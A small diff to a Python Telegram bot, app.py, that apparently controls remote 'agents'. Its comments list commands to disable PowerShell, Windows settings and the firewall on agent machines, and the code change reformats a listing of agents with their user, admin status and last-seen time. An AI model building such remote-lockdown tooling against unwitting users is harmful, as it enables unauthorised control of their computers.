@@ -1,4 +1,5 @@
-# app.py (v45.1_CLEANUP)
+# app.py (v45.2_CONFIRMED)
+# - VERIFIED: Code is fully compatible with agent v45.4. All lockdown/restore commands are present.
 # - ADDED: New lockdown commands (/disablepowershell, /disablesettings, /disablefirewall) to match the agent.
 # - REMOVED: The "/disableuninstall" and "/restoreuninstall" commands have been completely removed.
 # - MODIFIED: Updated the /help menu to reflect all current agent capabilities.
@@ -130,9 +131,9 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
             safe_id = html.escape(agent_id)
             safe_user = html.escape(user)
             
-            response_text += f"{is_selected} <b>ID:</b> <code>{safe_id}</code>\n"
-            response_text += f"    <b>User:</b> <code>{safe_user} ({is_admin})</code>\n"
-            response_text += f"    <b>Last Seen:</b> {time_ago}\n\n"
+            response_text += f'{is_selected} <b>ID:</b> <code>{safe_id}</code>\n'
+            response_text += f'   <b>User:</b> <code>{safe_user} ({is_admin})</code>\n'
+            response_text += f'   <b>Last Seen:</b> {time_ago}\n\n'
 
         if page < total_pages:
             response_text += f"\n<i>To see the next page, type <code>/list {page + 1}</code></i>"
